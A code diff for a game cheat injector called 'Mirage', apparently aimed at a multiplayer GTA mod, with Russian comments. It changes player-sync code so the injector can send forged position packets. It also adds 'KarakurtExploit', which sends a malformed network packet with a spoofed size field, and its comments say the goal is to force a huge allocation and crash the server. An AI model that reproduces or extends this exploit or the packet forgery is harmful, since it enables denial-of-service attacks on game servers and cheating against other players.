@@ -72,7 +72,7 @@
 #pragma warning (disable : 4244)
 #define LOG_NAME xorstr_("Mirage.log") // Имя лог файла
 #define WITH_LOGGING // Закоментить чтобы отключить вывод в лог файл
-#define MIRAGE_VERSION xorstr_("V5") // Версия инжектора
+#define MIRAGE_VERSION xorstr_("V5.3") // Версия инжектора
 #include <Windows.h>
 #include <stdio.h>
 #include <filesystem>
@@ -931,11 +931,41 @@ int sendBulletSync(CVector fake_vecStart, CVector fake_vecEnd)
 	}
 	return 0;
 }
+void WriteCameraOrientation(const CVector& vecPositionBase, NetBitStreamInterface& BitStream)
+{
+	// Заглушка: пишем дефолтные нули без расчётов
+	const float fPI = 3.14159265f;
+	SFloatAsBitsSync<8> rotation(-fPI, fPI, false);
+
+	// Пишем ротации как 0
+	rotation.data.fValue = 0.0f;
+	BitStream.Write(&rotation);  // Z rotation
+	rotation.data.fValue = 0.0f;
+	BitStream.Write(&rotation);  // X rotation
+
+	// Заглушка для позиции: используем relative (false), idx=0 (3 бита на компонент, range +-4)
+	bool bUseAbsolutePosition = false;
+	uint idx = 0;
+	uint uiNumBits = 3;
+	float fRange = 4.0f;
+
+	// Пишем флаг и индекс
+	BitStream.WriteBit(bUseAbsolutePosition);
+	BitStream.WriteBits(&idx, 2);
+
+	// Пишем позиции как 0
+	SFloatAsBitsSyncBase position(uiNumBits, -fRange, fRange, false);
+	position.data.fValue = 0.0f;
+	BitStream.Write(&position);  // X
+	position.data.fValue = 0.0f;
+	BitStream.Write(&position);  // Y
+	position.data.fValue = 0.0f;
+	BitStream.Write(&position);  // Z
+}
 int sendPlayerSync(CVector position)
 {
 	DWORD dwPlayerPed = *(DWORD*)0xB6F5F0;
 	if (!dwPlayerPed) return 0;
-
 	NetBitStreamInterface* bitStream = g_pNet->AllocateNetBitStream();
 	if (bitStream)
 	{
@@ -954,14 +984,18 @@ int sendPlayerSync(CVector position)
 		flags.data.bHasJetPack = false;
 		flags.data.bIsChoking = false;
 		flags.data.bIsDucked = false;
+		//
 		flags.data.bIsInWater = false;
+		flags.data.bSyncingVelocity = true;
+		flags.data.bIsOnGround = false;
+		//
 		flags.data.bIsOnFire = false;
 		flags.data.bStealthAiming = false;
 		flags.data.bWearsGoogles = false;
 
 		positionSync.data.vecPosition = position;
 		rotationSync.data.fRotation = 0.0f;
-		velocitySync.data.vecVelocity = CVector(0.0f, 0.0f, 0.0f);
+		velocitySync.data.vecVelocity = CVector(0.0f, 0.0f, 0.0f);//CVector(NAN, NAN, NAN);
 
 		healthSync.data.fValue = *(float*)(dwPlayerPed + 0x540);
 		armorSync.data.fValue = *(float*)(dwPlayerPed + 0x548);
@@ -977,12 +1011,10 @@ int sendPlayerSync(CVector position)
 		bitStream->Write(&healthSync);
 		bitStream->Write(&armorSync);
 		bitStream->Write(&camRotationSync);
-		callWriteCameraOrientation(position, *bitStream);
+		WriteCameraOrientation(position, *bitStream);
 		bitStream->WriteBit(false);
-
 		g_pNet->SendPacket(PACKET_ID_PLAYER_PURESYNC, bitStream, PACKET_PRIORITY_HIGH, PACKET_RELIABILITY_UNRELIABLE_SEQUENCED);
 		g_pNet->DeallocateNetBitStream(bitStream);
-
 		return 1;
 	}
 	return 0;
@@ -1797,4 +1829,51 @@ bool InstallFastmanHooks()
 
 	LogInFile(xorstr_("img_dump.log"), xorstr_("[LOG] All hooks installed successfully!\n"));
 	return true;
+}
+int KarakurtExploit(uint32_t fake_size) // KarakurtExploit(0x80000000, 1); — один шот для краша
+{
+	if (g_pNet == nullptr)
+	{
+		//LogInFile(LOG_NAME, xorstr_("[LOG] CNet pointer == null (KarakurtExploit)\n"));
+		return 0; // Нет сети — нахуй
+	}
+	NetBitStreamInterface* pBitStream = g_pNet->AllocateNetBitStream();
+	if (pBitStream)
+	{
+		// Fix: 32-bit header/flag ==1 (LE), чтоб пройти read+cmp на 0x10029194/0x1002919A — иначе early-exit
+		uint32_t header = 1;
+		pBitStream->Write((const char*)&header, sizeof(uint32_t));
+
+		// len0 = 0xFF — триггерим "широкую" длину, сервер прочитает 4 байта size после header
+		pBitStream->Write((char)0xFF);
+
+		// Size как uint32_t little-endian (4 байта сырых, чтоб сервер охуел от ~2x fake_size аллокации)
+		pBitStream->Write((const char*)&fake_size, sizeof(uint32_t));
+
+		// Junk: 2 байта нулей для length >=8 (теперь с header=11B, gate 0x100231E4 пройдёт)
+		// Сервер аллоцирует full size ДО ReadAlignedBytes, так что DoS даже если junk мало
+		char junk[2] = { 0x00, 0x00 };
+		pBitStream->Write(junk, 2);
+
+		// Log fix: %08X для hex, без string UB — чисто uint32_t
+		//LogInFile(LOG_NAME, xorstr_("[LOG] Karakurt: BitStream size=11B, fake_size=0x%08X\n"), fake_size);
+
+		// Send + check bool — клиентский netc.dll может дропнуть server-only ID
+		bool sent = g_pNet->SendPacket(PACKET_ID_LIGHTSYNC, pBitStream, PACKET_PRIORITY_LOW, PACKET_RELIABILITY_UNRELIABLE);
+		g_pNet->DeallocateNetBitStream(pBitStream);
+
+		if (!sent)
+		{
+			//LogInFile(LOG_NAME, xorstr_("[LOG] Karakurt: SendPacket failed (netc.dll filter? server-only ID?)\n"));
+			return 0; // Не улетело — хуйня на клиенте
+		}
+
+		//LogInFile(LOG_NAME, xorstr_("[LOG] Karakurt: Packet sent (post-join?), wait for server OOM/terminate in net.dll (sub_10003210)\n"));
+	}
+	else
+	{
+		//LogInFile(LOG_NAME, xorstr_("[LOG] Karakurt: AllocateNetBitStream failed\n"));
+		return 0;
+	}
+	return 1;
 }
